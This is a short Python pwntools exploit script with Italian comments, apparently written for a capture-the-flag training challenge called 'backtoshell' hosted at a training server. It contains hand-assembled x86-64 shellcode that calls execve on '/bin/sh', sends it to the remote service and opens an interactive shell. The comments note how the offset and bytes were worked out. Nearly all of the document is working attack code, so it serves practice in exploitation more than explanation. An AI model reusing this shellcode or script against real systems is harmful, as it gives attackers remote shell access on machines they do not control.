from pwn import *

asm_code = """
mov rdi, rax # quì dentro mette l'indirizzo di rax su rdi perchè in rdi voglio mettere l'indirizzo da eseguire (questo indirizzo di rax lo trovo usando gdb)
add rdi, 16  # offset: da dove inizia lo stack a .byte 0x0 escluso (ogni due sono un byte) --> lo vede in disassembly:
mov rax, 0x3b # questo lo ha visto sul sito con le syscall guardando execve
syscall
.byte 0x0     # Questo lo metto per il calcolo dell'offset
nop           # I nop li metto a caso tanto poi li andrò a togliere (vedere sotto)
nop
nop
nop

"""

context.arch = 'amd64'

#asm sopra meglio andare sul sito e fare assemble (con x64): nel sito https://defuse.ca/online-x86-assembler.htm su String Literal prendo tutto tranne \x00\x90\x90\x90\x90 che corrisponde al byte 0x0 e ai nope e da lì metto /bin/sh seguito dal terminatore \x00
shellcode = b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"

#p = process("./backtoshell")
p = remote("bin.training.offdef.it", 3001)
p.send(shellcode)

p.interactive()
